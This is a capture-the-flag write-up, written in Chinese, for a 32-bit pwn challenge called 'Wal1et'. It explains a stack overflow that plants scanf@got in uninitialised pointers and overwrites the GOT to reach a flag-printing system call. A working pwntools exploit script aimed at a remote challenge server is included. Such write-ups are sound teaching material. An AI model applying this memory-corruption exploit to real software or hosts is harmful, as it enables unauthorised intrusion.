# pwn-1

Wal1et

## 文件属性

|属性  |值    |
|------|------|
|Arch  |x32   |
|RELRO|Partial|
|Canary|on    |
|NX    |on    |
|PIE   |off   |
|strip |no    |

## 解题思路

```c
void check(void)

{
  int local_14;
  int local_10;
  
  printf("Now try the First password : ");
  __isoc99_scanf("%d",local_14);
  fflush(_stdin);
  printf("Now try the Second password : ");
  __isoc99_scanf("%d",local_10);
  puts("Let me think......");
  if ((local_14 == 0x528e6) && (local_10 == 0xcc07c9)) {
    puts("OMG!YOU SUCCESS!"); // check + 0x98
    system("/bin/cat flag");
    return;
  }
  puts("You Failed! Try again.");
                    // WARNING: Subroutine does not return
  exit(0);
}
```

审计`check`函数的代码，32位，`local_14`和`local_10`既是int也是指针。在函数`begin`中，
可以输入大量数据覆盖栈帧，而这两个指针的值并未经过初始化，从而可以指定这两个变量的值。
题目要求这两个变量的值为`0x528e6`和`0xcc07c9`，但它们不可能是有效的指针，在运行scanf的时候会引发SIGSEGV。
因此将其覆盖为`scanf@got`，并利用`check`中的`scanf`将`check+0x98`写入指针中，
这样在读入第二个数的时候就会跳到`scanf@plt`，再运行`scanf@got`的地址，
即从`puts("OMG!YOU SUCCESS!")`开始运行，打印出flag

## EXPLOIT

```python
from pwn import *
context.terminal = ['tmux','splitw','-h']
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './Wal1et'

def payload(lo:int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('101.132.170.0', 32687)
    elf = ELF(EXE)
    scanfGot = elf.got['__isoc99_scanf']

    sh.sendlineafter(b'JUST', b'1')
    # reach the length of %108s, so use send to prevent \n drop down
    sh.sendafter(b'name', b'Rocket'.ljust(0x64, b'\0') + p32(scanfGot) + p32(scanfGot))
    sh.sendlineafter(b'First', str(0x804871b).encode()) # check + 0x98
    sh.sendlineafter(b'Second', str(0x804871b).encode())

    sh.recvuntil(b'flag{')
    flag = sh.recvuntil(b'}')
    success(f'{GOLD_TEXT("Flag is:")} {"flag{"}{flag.decode()}')
    sh.close()
```
